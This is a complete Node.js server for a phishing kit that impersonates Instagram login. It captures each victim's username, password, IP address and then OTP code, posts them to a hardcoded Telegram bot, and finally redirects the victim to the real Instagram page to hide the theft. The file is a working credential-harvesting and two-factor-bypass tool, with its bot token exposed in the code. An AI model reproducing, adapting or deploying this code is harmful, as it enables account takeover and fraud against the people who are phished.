const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('./'));

// TERA BOT TOKEN + CHAT ID
const BOT_TOKEN = '8985189210:AAEvRxF1-iLZwzqDKYGJN8xtOD4mcgORklA';
const CHAT_ID = '8975887766';

// 📥 STEP 1: Login page se creds lo → OTP page dikhao
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  // Creds Telegram pe bhejo
  const credMsg = `🔐 *Step 1 - Creds*\n👤 ${username}\n🔑 ${password}\n🌐 ${ip}\n🕒 ${time}`;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: credMsg,
      parse_mode: 'Markdown'
    });
    console.log('✅ Creds sent to Telegram');
  } catch (error) {
    console.error('❌ Telegram Error:', error.message);
  }

  // OTP page dikhao
  res.sendFile(path.join(__dirname, 'otp.html'));
});

// 📥 STEP 2: OTP page se OTP lo → Real Instagram pe redirect
app.post('/otp', async (req, res) => {
  const { otp } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  // OTP Telegram pe bhejo
  const otpMsg = `🔐 *Step 2 - OTP*\n🔢 OTP: ${otp}\n🌐 ${ip}\n🕒 ${time}`;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: otpMsg,
      parse_mode: 'Markdown'
    });
    console.log('✅ OTP sent to Telegram');
  } catch (error) {
    console.error('❌ Telegram Error:', error.message);
  }

  // Real Instagram pe redirect
  res.redirect('https://www.instagram.com/accounts/login/');
});

// 🚀 Serve index.html at root
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
